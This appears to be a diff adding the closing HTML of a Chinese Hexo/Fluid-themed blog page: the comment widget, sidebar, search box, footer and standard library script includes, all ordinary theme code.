+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
